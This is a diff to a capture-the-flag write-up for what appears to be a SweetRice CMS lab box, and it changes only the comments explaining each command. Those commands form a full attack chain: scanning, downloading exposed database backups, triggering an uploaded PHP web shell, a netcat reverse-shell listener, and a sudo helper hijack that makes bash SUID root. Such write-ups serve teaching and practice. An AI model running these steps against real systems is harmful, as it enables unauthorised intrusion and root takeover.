@@ -51,8 +51,8 @@ bash -p ? root.txt
 ## 1. Reconnaissance
 
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: run a full port scan and service enumeration.
+# Why here: identify active services like SSH and Apache to map the initial attack surface.
 nmap -sS -p- -n -Pn $TARGET
 nmap -sVC -p22,80 $TARGET -oA service
 ```
@@ -65,8 +65,8 @@ nmap -sVC -p22,80 $TARGET -oA service
 Quick exploit DB check on the SSH banner:
 
 ```bash
-# What it does: searches for or copies a local Exploit-DB PoC.
-# Why here: relate the detected version to a reusable exploit.
+# What it does: search for exploits matching the detected OpenSSH version.
+# Why here: evaluate if remote exploitation of the SSH service is feasible for initial access.
 searchsploit OpenSSH 7.2p2
 # OpenSSH 7.2p2 - Username Enumeration   | linux/remote/40136.py
 ```
@@ -78,8 +78,8 @@ CVE-2016-6210 is a username enumeration oracle  handy if spraying, but not a f
 ## 2. Web Enumeration
 
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: perform directory and file discovery with a medium-sized wordlist.
+# Why here: identify the hidden SweetRice CMS installation and exposed database backups.
 feroxbuster -u http://$TARGET \
   -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 ```
@@ -101,8 +101,8 @@ http://$TARGET/content/as/                     ? SweetRice admin panel
 Mirror every database-related artefact:
 
 ```bash
-# What it does: downloads the specified URL to disk.
-# Why here: bring evidence, payloads or files needed to advance.
+# What it does: download the discovered SQL backup and database files.
+# Why here: exfiltrate sensitive data for offline analysis, specifically searching for administrative credentials.
 wget http://$TARGET/content/inc/cache/cache.db
 wget http://$TARGET/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
 wget http://$TARGET/content/as/lib/app_sqlite.sql
@@ -176,8 +176,8 @@ Upload it via **Media Center ? Attach new medium**. The extracted PHP shell show
 
 ```bash
 # Sanity check
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: test the uploaded PHP shell for command execution.
+# Why here: verify that the SweetRice ZIP upload exploit was successful and we have RCE.
 curl "http://$TARGET/content/attachment/55db1b618c6ed7a8b5a572345fc45009.php?cmd=id"
 
 # Attacker: nc -lvnp 4444
@@ -195,8 +195,8 @@ Lands as **`www-data`** on `THM-Chal`.
 Standard [Linux enumeration](../../exploits/enumeration/linux-enumeration.md) pass:
 
 ```bash
-# What it does: executes a Windows command line action.
-# Why here: enumerate, transfer, replace or validate artifacts on the victim.
+# What it does: verify the current user identity in the reverse shell.
+# Why here: confirm we are running as 'www-data' and begin local enumeration.
 whoami
 id
 # What it does: displays a file in the terminal.
@@ -226,8 +226,8 @@ Spotted: a `backup.pl` in the same home  pin for the privesc step.
 ## 6. Privilege Escalation  sudo perl + writable helper
 
 ```bash
-# What it does: lists sudo privileges of the current or specified user.
-# Why here: encontrar comandos permitidos para escalar privilegios.
+# What it does: check the 'www-data' user's sudo permissions.
+# Why here: identify the backup.pl script that can be run via sudo, pointing to a privilege escalation path.
 sudo -l
 # User www-data may run the following commands on THM-Chal:
 #     (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
@@ -256,13 +256,13 @@ Full technique: [sudo-script-helper-hijack.md](../../exploits/privesc-linux/sudo
 
 ```bash
 # 1. Replace the helper with the payload
-# What it does: escribe un comando payload en un archivo o entrada vulnerable.
-# Why here: convertir script/ruta escribible en ejecucion de codigo.
+# What it does: replace the contents of the world-writable /etc/copy.sh script with a SUID payload.
+# Why here: leverage the sudo-allowed backup.pl script to execute our payload as root.
 echo 'chmod u+s /bin/bash' > /etc/copy.sh
 
 # 2. Trigger via the sudo-allowed outer script
-# What it does: ejecuta un comando permitido por sudo con ruta absoluta.
-# Why here: disparar la primitiva de privesc encontrada con sudo -l.
+# What it does: execute the backup.pl script via sudo.
+# Why here: trigger the execution of the hijacked /etc/copy.sh script as root.
 sudo /usr/bin/perl /home/itguy/backup.pl
 
 # 3. /bin/bash is now SUID root
@@ -273,8 +273,8 @@ ls -la /bin/bash
 
 # 4. -p preserves the elevated EUID
 bash -p
-# What it does: executes a Windows command line action.
-# Why here: enumerate, transfer, replace or validate artifacts on the victim.
+# What it does: verify the root shell.
+# Why here: confirm successful privilege escalation to the root user.
 whoami           # root
 id
 ```
